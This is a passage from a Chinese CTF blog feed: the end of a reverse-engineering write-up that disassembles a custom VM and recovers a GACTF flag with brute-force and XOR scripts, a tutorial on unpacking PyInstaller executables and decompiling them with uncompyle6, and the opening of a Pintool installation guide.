class="number">0x80</span>:</span><br><span class="line">        idata=(opcode[i+<span class="number">5</span>]&lt;&lt;<span class="number">24</span>)+(opcode[i+<span class="number">4</span>]&lt;&lt;<span class="number">16</span>)+(opcode[i+<span class="number">3</span>]&lt;&lt;<span class="number">8</span>)+(opcode[i+<span class="number">2</span>])</span><br><span class="line">        print(<span class="string">&quot;r%d=0x%x&quot;</span>%(opcode[i+<span class="number">1</span>],idata))</span><br><span class="line">        i+=<span class="number">6</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0x99</span>:</span><br><span class="line">        print(<span class="string">&quot;exit&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0xA0</span>:</span><br><span class="line">        print(<span class="string">&quot;check1(r1==653840640)&quot;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0xA1</span>:</span><br><span class="line">        print(<span class="string">&quot;check2(input flag;strlen(flag)==33)&quot;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0xA4</span>:</span><br><span class="line">        reg=(opcode[i+<span class="number">3</span>]&lt;&lt;<span class="number">16</span>)+(opcode[i+<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)+(opcode[i+<span class="number">1</span>])</span><br><span class="line">        print(<span class="string">&quot;arr[%d]=r1&quot;</span>%reg)</span><br><span class="line">        i+=<span class="number">4</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0xB1</span>:</span><br><span class="line">        print(<span class="string">&quot;r9=arr[0]&quot;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0xB2</span>:</span><br><span class="line">        print(<span class="string">&quot;r9=arr[1]&quot;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0xB3</span>:</span><br><span class="line">        print(<span class="string">&quot;r9=arr[2]&quot;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0xB4</span>:</span><br><span class="line">        print(<span class="string">&quot;r9=arr[3]&quot;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0xC1</span>:</span><br><span class="line">        print(<span class="string">&quot;r1=flag[%d]&quot;</span>%opcode[i+<span class="number">1</span>])</span><br><span class="line">        i+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0xC2</span>:</span><br><span class="line">        idata=(opcode[i+<span class="number">4</span>]&lt;&lt;<span class="number">24</span>)+(opcode[i+<span class="number">3</span>]&lt;&lt;<span class="number">16</span>)+(opcode[i+<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)+(opcode[i+<span class="number">1</span>])</span><br><span class="line">        print(<span class="string">&quot;check3(r1==0x%x)&quot;</span>%idata)</span><br><span class="line">        i+=<span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0x53</span>:</span><br><span class="line">        print(<span class="string">&quot;[Unkn] 0x53: %x&quot;</span>%opcode[i+<span class="number">1</span>])</span><br><span class="line">        i+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0x54</span>:</span><br><span class="line">        print(<span class="string">&quot;[Unkn] 0x54: %x&quot;</span>%opcode[i+<span class="number">1</span>])</span><br><span class="line">        i+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0x11</span>:</span><br><span class="line">        print(<span class="string">&quot;[Unkn] 0x11&quot;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;[!]unknown opcode %d&quot;</span>%opcode[i])</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line">r1=myInput</span><br><span class="line">r9=r1</span><br><span class="line">r2=<span class="number">0xd</span></span><br><span class="line">r1&gt;&gt;=r2</span><br><span class="line">r1^=r9</span><br><span class="line">r9=r1</span><br><span class="line">r2=<span class="number">0x9</span></span><br><span class="line">r1&lt;&lt;=r2</span><br><span class="line">r2=<span class="number">0x78f39600</span></span><br><span class="line">r1&amp;=r2</span><br><span class="line">r1^=r9</span><br><span class="line">r9=r1</span><br><span class="line">r2=<span class="number">0x11</span></span><br><span class="line">r1&lt;&lt;=r2</span><br><span class="line">r2=<span class="number">0x85d40000</span></span><br><span class="line">r1&amp;=r2</span><br><span class="line">r1^=r9</span><br><span class="line">r9=r1</span><br><span class="line">r2=<span class="number">0x13</span></span><br><span class="line">r1&gt;&gt;=r2</span><br><span class="line">r1^=r9</span><br><span class="line">check1(r1==<span class="number">653840640</span>)</span><br><span class="line"><span class="comment"># 可以看到check1只调用了一次，并且这里是用来check最开始输入的数字的，因此以这里为界把分析分成了两部分，以下则是check再次输入的flag部分</span></span><br><span class="line"></span><br><span class="line">r1=myInput</span><br><span class="line">r2=<span class="number">0xff</span></span><br><span class="line">r1&amp;=r2</span><br><span class="line">r3=<span class="number">0x2</span></span><br><span class="line">r1*=r3</span><br><span class="line">r2=<span class="number">0x18</span></span><br><span class="line">r1+=r2</span><br><span class="line">arr[<span class="number">0</span>]=r1</span><br><span class="line">r1=myInput</span><br><span class="line">r2=<span class="number">0x8</span></span><br><span class="line">r1&gt;&gt;=r2</span><br><span class="line">r2=<span class="number">0xff</span></span><br><span class="line">r1&amp;=r2</span><br><span class="line">r5=<span class="number">0x7</span></span><br><span class="line">r1/=r5</span><br><span class="line">r2=<span class="number">0x21</span></span><br><span class="line">r1+=r2</span><br><span class="line">arr[<span class="number">1</span>]=r1</span><br><span class="line">r1=myInput</span><br><span class="line">r2=<span class="number">0x10</span></span><br><span class="line">r1&gt;&gt;=r2</span><br><span class="line">r2=<span class="number">0xff</span></span><br><span class="line">r1&amp;=r2</span><br><span class="line">r9=<span class="number">0xbb</span></span><br><span class="line">r1^=r9</span><br><span class="line">r2=<span class="number">0xff</span></span><br><span class="line">r1+=r2</span><br><span class="line">arr[<span class="number">2</span>]=r1</span><br><span class="line">r1=myInput</span><br><span class="line">r2=<span class="number">0x18</span></span><br><span class="line">r1&gt;&gt;=r2</span><br><span class="line">r2=<span class="number">0xff</span></span><br><span class="line">r1&amp;=r2</span><br><span class="line">r4=<span class="number">0xa0</span></span><br><span class="line">r1-=r4</span><br><span class="line">r2=<span class="number">0x77</span></span><br><span class="line">r1+=r2</span><br><span class="line">arr[<span class="number">3</span>]=r1</span><br><span class="line">check2(<span class="built_in">input</span> flag;strlen(flag)==<span class="number">33</span>)</span><br><span class="line">r1=flag[<span class="number">0</span>]</span><br><span class="line">r9=arr[<span class="number">0</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x10b</span>)</span><br><span class="line">r1=flag[<span class="number">1</span>]</span><br><span class="line">r9=arr[<span class="number">1</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x7a</span>)</span><br><span class="line">r1=flag[<span class="number">2</span>]</span><br><span class="line">r9=arr[<span class="number">3</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x95</span>)</span><br><span class="line">r1=flag[<span class="number">3</span>]</span><br><span class="line">r9=arr[<span class="number">2</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x106</span>)</span><br><span class="line">r1=flag[<span class="number">4</span>]</span><br><span class="line">r9=arr[<span class="number">1</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x7d</span>)</span><br><span class="line">r1=flag[<span class="number">5</span>]</span><br><span class="line">r9=arr[<span class="number">3</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0xad</span>)</span><br><span class="line">r1=flag[<span class="number">6</span>]</span><br><span class="line">r9=arr[<span class="number">0</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x12f</span>)</span><br><span class="line">r1=flag[<span class="number">7</span>]</span><br><span class="line">r9=arr[<span class="number">2</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x165</span>)</span><br><span class="line">r1=flag[<span class="number">8</span>]</span><br><span class="line">r9=arr[<span class="number">0</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x12d</span>)</span><br><span class="line">r1=flag[<span class="number">9</span>]</span><br><span class="line">r9=arr[<span class="number">0</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x12f</span>)</span><br><span class="line">r1=flag[<span class="number">10</span>]</span><br><span class="line">r9=arr[<span class="number">2</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x139</span>)</span><br><span class="line">r1=flag[<span class="number">11</span>]</span><br><span class="line">r9=arr[<span class="number">2</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x10d</span>)</span><br><span class="line">r1=flag[<span class="number">12</span>]</span><br><span class="line">r9=arr[<span class="number">3</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0xbb</span>)</span><br><span class="line">r1=flag[<span class="number">13</span>]</span><br><span class="line">r9=arr[<span class="number">1</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x8</span>)</span><br><span class="line">r1=flag[<span class="number">14</span>]</span><br><span class="line">r9=arr[<span class="number">2</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x10d</span>)</span><br><span class="line">r1=flag[<span class="number">15</span>]</span><br><span class="line">r9=arr[<span class="number">0</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x13f</span>)</span><br><span class="line">r1=flag[<span class="number">16</span>]</span><br><span class="line">r9=arr[<span class="number">2</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x13a</span>)</span><br><span class="line">r1=flag[<span class="number">17</span>]</span><br><span class="line">r9=arr[<span class="number">2</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x161</span>)</span><br><span class="line">r1=flag[<span class="number">18</span>]</span><br><span class="line">r9=arr[<span class="number">1</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x57</span>)</span><br><span class="line">r1=flag[<span class="number">19</span>]</span><br><span class="line">r9=arr[<span class="number">0</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x120</span>)</span><br><span class="line">r1=flag[<span class="number">20</span>]</span><br><span class="line">r9=arr[<span class="number">2</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x10d</span>)</span><br><span class="line">r1=flag[<span class="number">21</span>]</span><br><span class="line">r9=arr[<span class="number">0</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x13f</span>)</span><br><span class="line">r1=flag[<span class="number">22</span>]</span><br><span class="line">r9=arr[<span class="number">2</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x13f</span>)</span><br><span class="line">r1=flag[<span class="number">23</span>]</span><br><span class="line">r9=arr[<span class="number">3</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0xb5</span>)</span><br><span class="line">r1=flag[<span class="number">24</span>]</span><br><span class="line">r9=arr[<span class="number">0</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x113</span>)</span><br><span class="line">r1=flag[<span class="number">25</span>]</span><br><span class="line">r9=arr[<span class="number">3</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0xa0</span>)</span><br><span class="line">r1=flag[<span class="number">26</span>]</span><br><span class="line">r9=arr[<span class="number">0</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x121</span>)</span><br><span class="line">r1=flag[<span class="number">27</span>]</span><br><span class="line">r9=arr[<span class="number">2</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x10d</span>)</span><br><span class="line">r1=flag[<span class="number">28</span>]</span><br><span class="line">r9=arr[<span class="number">1</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0xb</span>)</span><br><span class="line">r1=flag[<span class="number">29</span>]</span><br><span class="line">r9=arr[<span class="number">2</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x139</span>)</span><br><span class="line">r1=flag[<span class="number">30</span>]</span><br><span class="line">r9=arr[<span class="number">0</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x173</span>)</span><br><span class="line">r1=flag[<span class="number">31</span>]</span><br><span class="line">r9=arr[<span class="number">1</span>]</span><br><span class="line">r1^=r9</span><br><span class="line">check3(r1==<span class="number">0x46</span>)</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>根据上半部分的分析写出爆破脚本把这个数字爆破出来：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> i=<span class="number">0</span>;i&lt;<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">128</span>);i++)&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> x=i;</span><br><span class="line">        <span class="keyword">if</span>(((((((((((x&gt;&gt;<span class="number">0xd</span>)^x)&lt;&lt;<span class="number">0x9</span>)&amp;<span class="number">0x78f39600</span>)^(x&gt;&gt;<span class="number">0xd</span>)^x)&lt;&lt;<span class="number">0x11</span>)&amp;<span class="number">0x85d40000</span>)^((((x&gt;&gt;<span class="number">0xd</span>)^x)&lt;&lt;<span class="number">0x9</span>)&amp;<span class="number">0x78f39600</span>)^(x&gt;&gt;<span class="number">0xd</span>)^x)&gt;&gt;<span class="number">0x13</span>)^((((((((x&gt;&gt;<span class="number">0xd</span>)^x)&lt;&lt;<span class="number">0x9</span>)&amp;<span class="number">0x78f39600</span>)^(x&gt;&gt;<span class="number">0xd</span>)^x)&lt;&lt;<span class="number">0x11</span>)&amp;<span class="number">0x85d40000</span>)^((((x&gt;&gt;<span class="number">0xd</span>)^x)&lt;&lt;<span class="number">0x9</span>)&amp;<span class="number">0x78f39600</span>)^(x&gt;&gt;<span class="number">0xd</span>)^x))==<span class="number">653840640</span>)&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 其实有很多地方不必加括号的，这里为了保险就全加了</span></span><br><span class="line"><span class="comment">// output：4293442714</span></span><br></pre></td></tr></table></figure><p>可以爆出这个数是4293442714，输入，发现果然出现了输入flag的提示：</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210103174524998.png"></p><p>接下来是flag的部分，逻辑很清楚啦，就是用这个数字生成一个arr数组，然后用flag[i] xor arr中的某一个等于已知值，基操xor不用多说。</p><p>这里为了更快处理就直接把check2下边的部分复制到<code>code.txt</code>中了，直接进行自动化计算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># x=4293442714</span></span><br><span class="line"><span class="comment"># arr=[0,0,0,0]</span></span><br><span class="line"><span class="comment"># arr[0]=(x&amp;0xff)*2+0x18</span></span><br><span class="line"><span class="comment"># arr[1]=((x&gt;&gt;0x8)&amp;0xff)//0x7+0x21</span></span><br><span class="line"><span class="comment"># arr[2]=(((x&gt;&gt;0x10)&amp;0xff)^0xbb)+0xff</span></span><br><span class="line"><span class="comment"># arr[3]=(((x&gt;&gt;0x18)&amp;0xff)-0xa0)+0x77</span></span><br><span class="line"><span class="comment"># print(arr)</span></span><br><span class="line">arr=[<span class="number">332</span>,<span class="number">59</span>,<span class="number">338</span>,<span class="number">214</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>*<span class="number">4</span>):</span><br><span class="line">        line=f.readline().replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">4</span>==<span class="number">1</span>:</span><br><span class="line">            s=line[<span class="number">3</span>:]+<span class="string">&quot;^&quot;</span></span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">4</span>==<span class="number">3</span>:</span><br><span class="line">            s+=line[<span class="number">11</span>:<span class="number">-1</span>]</span><br><span class="line">            print(<span class="built_in">chr</span>(<span class="built_in">eval</span>(s)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>flag就出来啦~</p><h2 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h2><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210103175000167.png"></p><p><strong>GACTF{c7ack_m3_sh3ll_smc_vm_0k?}</strong></p><hr><p><strong>TBC…</strong></p>]]></content>
      
      
      <categories>
          
          <category> 刷题log </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RE套路 - 关于pyinstaller打包文件的复原</title>
      <link href="p/reSkillsOn-Pyinstaller-extracted-to-python/"/>
      <url>p/reSkillsOn-Pyinstaller-extracted-to-python/</url>
      
        <content type="html"><![CDATA[<p>因为见到好多re题都是这个图标 ↓ 的exe，于是决定总结一下这种python题目的套路（其实是怕太久没遇到就忘了怎么做了。</p><p>P.S. 前几天XCTF遇到一道极其少见的pyinstaller打包elf的逆向题，于是对本文进行了更新，添加解包elf内容，并更名为”关于pyinstaller打包文件的复原”，记录pyinstaller打包后的exe和elf如何解包-&gt;反编译-&gt;获得py源码的过程。</p><a id="more"></a><p><img src="/p/reSkillsOn-Pyinstaller-extracted-to-python/image-20201205132623712.png"></p><p>BTW：此篇blog主要是为了方便自己<del>复制粘贴</del>，所以命令里也直接放上路径了，把对应路径替换成自己的就好。</p><blockquote><p>环境和工具：win10 + wsl2 + 010Editor</p><p>pyinstxtractor项目地址：<a href="https://github.com/extremecoders-re/pyinstxtractor">extremecoders-re&#x2F;pyinstxtractor: PyInstaller Extractor</a></p><p>uncompyle6安装方法见：<a href="https://www.cnblogs.com/pcat/p/11625300.html">uncompyle6安装使用方法</a></p></blockquote><h1 id="pyinstxtractor"><a href="#pyinstxtractor" class="headerlink" title="pyinstxtractor"></a>pyinstxtractor</h1><p>两种格式的解包方式只有这一part不一样，下面的操作流程都相同。</p><h2 id="exe"><a href="#exe" class="headerlink" title="exe"></a>exe</h2><p>在cmd运行（easyRE.exe当前目录下打开：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> D:\_CTF_\_Tools_\pyinstxtractor.py .</span><br><span class="line">python2 pyinstxtractor.py easyRE.exe</span><br></pre></td></tr></table></figure><p>其中第一行是将pyinstxtractor.py复制到当前目录下，然后第二行是使用pyinstxtractor（注意是python2）。</p><p>会在当前目录生成easyRE.exe_extracted文件夹，其中<strong>有用的是<code>easyRE</code>（一般是解包提示是entry point的名字）和<code>struct</code>两个没有后缀名的文件</strong>。</p><h2 id="elf"><a href="#elf" class="headerlink" title="elf"></a>elf</h2><p>在<a href="https://github.com/extremecoders-re/pyinstxtractor/wiki/Extracting-Linux-ELF-binaries">pyinstxtractor官方项目的wiki</a>中有提到如何解压elf，在此把第一种简单的方法记录下来（亲测有效。</p><p>在wsl运行（同样是当前目录，这里文件名是main</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /mnt/d/_CTF_/_Tools_/pyinstxtractor.py .</span><br><span class="line">objcopy --dump-section pydata=easyRE.dump easyRE</span><br><span class="line">python2 pyinstxtractor.py easyRE.dump</span><br></pre></td></tr></table></figure><p>就多了第二行，这里是把elf里pydata段分离开，具体看官方解释。</p><p>然后会在当前目录下生成easyRE.dump_extracted文件夹，同样<strong>是<code>easyRE</code>（一般是解包提示是entry point的名字）和<code>struct</code>有用</strong>。</p><h1 id="补头，将无后缀文件改为-pyc"><a href="#补头，将无后缀文件改为-pyc" class="headerlink" title="补头，将无后缀文件改为.pyc"></a>补头，将无后缀文件改为.pyc</h1><p>原easyRE文件的开头。</p><p><img src="/p/reSkillsOn-Pyinstaller-extracted-to-python/image-20201102001918771.png"></p><p>struct文件的开头。</p><p><img src="/p/reSkillsOn-Pyinstaller-extracted-to-python/image-20201102002058477.png"></p><p><strong>ctrl+shift+i -&gt; 写下要增加的字节数size，右边value填0 -&gt; 在struct文件里ctrl+c -&gt; 回来光标在最开始时ctrl+v。</strong></p><p><img src="/p/reSkillsOn-Pyinstaller-extracted-to-python/image-20201102003044827.png"></p><p>得到</p><p><img src="/p/reSkillsOn-Pyinstaller-extracted-to-python/image-20201102003412300.png"></p><p>这一步是将前面少了的文件头部分插入到easyRE的开头，形成新的二进制文件（不然会报错<code>Invalid pyc/pyo file - Magic value mismatch!</code>），并增加后缀名<code>.pyc</code>。</p><p>（补充二进制数据的目的是为了保证Magic value能match上，具体原理自行搜索。</p><h1 id="uncompyle6"><a href="#uncompyle6" class="headerlink" title="uncompyle6"></a>uncompyle6</h1><p>最后在cmd输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 easyRE.pyc &gt; easyRE.py</span><br></pre></td></tr></table></figure><p>即可获取<code>easyRE.py</code>，有源代码就能逆啦0v0。</p>]]></content>
      
      
      <categories>
          
          <category> Skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> u5eful </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【从无到有】Pintool安装&amp;使用</title>
      <link href="p/toolsOf-Pintool/"/>
      <url>p/toolsOf-Pintool/</url>
      
        <content type="html"><![CDATA[<p>是一套完整的Pintool入门流程，之前说坑多没装上是因为用的还只是wsl+没有虚拟机，现在（折腾完wsl2+装了vmware以后）终于可以用上Pintool了！</p><p>亲测<code>wsl2</code>和<code>Kali-linux 2020.2</code>都能成功（且步骤相同</p><a id="more"></a><blockquote><p>Pintool工具：<a href="https://github.com/wagiro/pintool">wagiro&#x2F;pintool: This tool can be useful for solving some reversing challenges in CTFs events.</a></p><p>bilud Pin部分参考：<a href="https://github.com/wagiro/pintool/issues/2">Erro at the execution</a></p></blockquote><h1 id="原始文件下载"><a href="#原始文件下载" class="headerlink" title="原始文件下载"></a>原始文件下载</h1><h2 id="Pintool"><a href="#Pintool" class="headerlink" title="Pintool"></a>Pintool</h2><p>在<a href="https://github.com/wagiro/pintool">Pintool工具</a>处下载代码（<code>pintool-master</code>；其实有用的只有<code>pintool.py</code>这一个文件，其他都是例子）。</p><p><img src="/p/toolsOf-Pintool/image-20201127203457870.png"></p><h2 id="Pin"><a href="#Pin" class="headerlink" title="Pin"></a>Pin</h2><p>在<a href="https://software.intel.com/content/www/us/en/develop/articles/pin-a-binary-instrumentation-tool-downloads.html">Pin官网的下载页面</a>下载Linux栏的Pin最新版并解压，可以把文件夹名改短一点（<code>pin-3.17-gcc-linux</code>）。</p><p><img src="/p/toolsOf-Pintool/image-20201127203148655.png"></p><h1 id="Build-Pin"><a href="#Build-Pin" class="headerlink" title="Build Pin"></a>Build Pin</h1><p>将<code>pin-3.17-gcc-linux</code>放入<code>pintool-master</code>中，即：</p><p><img 